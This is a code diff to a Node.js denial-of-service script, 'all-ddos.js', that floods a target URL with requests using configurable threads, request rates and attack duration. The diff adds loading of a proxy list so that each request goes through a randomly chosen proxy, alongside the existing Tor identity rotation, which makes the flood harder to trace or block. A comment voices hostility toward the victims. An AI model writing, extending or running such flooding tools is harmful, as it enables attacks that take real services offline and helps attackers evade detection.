@@ -27,10 +27,11 @@
  const attackDuration = process.argv[5] || 60; // Attack duration in seconds (default 60)
  const torIdentityInterval = process.argv[6] || 30; // Tor identity renewal interval in seconds
  const advancedMode = process.argv[7] || false; // Enable advanced features
+ const proxyListFile = process.argv[8]; // File containing list of proxy servers
  
 
  if (!targetURL) {
-  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval] [advancedMode]"));
+  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval] [advancedMode] [proxyListFile]"));
   process.exit(1);
  }
  
@@ -50,6 +51,7 @@
  let requestCount = 0; // Initialize the request counter
  let lastMinuteStart = Date.now(); // Initialize the start time of the last minute
  let startTime = Date.now();
+ let proxyList = []; // Array to hold proxy servers
  
 
  function logAction(message) {
@@ -88,6 +90,20 @@
  }
  
 
+ // Function to load proxies from a file
+ async function loadProxyList(filePath) {
+  try {
+  const fs = require('fs').promises; // Use promises for async file reading
+  const data = await fs.readFile(filePath, 'utf8');
+  proxyList = data.split('\n').map(proxy => proxy.trim()).filter(proxy => proxy);
+  console.log(chalk.purple.bold(`Loaded ${proxyList.length} proxies from ${filePath}`));
+  } catch (error) {
+  console.error(chalk.red(`Error loading proxy list: ${error.message}`));
+  proxyList = []; // Ensure proxyList is an empty array if loading fails
+  }
+ }
+ 
+
  async function attack() {
   const urlObject = new URL(targetURL);
   const hostname = urlObject.hostname;
@@ -114,7 +130,14 @@
   const protocol = targetURL.startsWith('https') ? https : http; // Choose http or https
  
 
-  if (onion) {
+  // Proxy handling
+  if (proxyList.length > 0) {
+  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+  const proxyUrl = new URL(`http://${proxy}`);
+  const agent = new SocksProxyAgent({protocol: 'http', host: proxyUrl.hostname, port: proxyUrl.port});
+  options.agent = agent;
+  console.log(chalk.dark_blue(`Using proxy: ${proxy}`));
+  } else if (onion) {
   options.agent = new SocksProxyAgent({ protocol: 'socks5h:', host: '127.0.0.1', port: 9050 }); // use tor proxy on .onion
   }
  
@@ -191,6 +214,12 @@
   }
   logAction(chalk.purple('Tor identity renewed, hopefully those bastards are still dealing with my shit.'));
   });
+ }
+ 
+
+ // Load proxy list if provided
+ if (proxyListFile) {
+  loadProxyList(proxyListFile);
  }
  
 
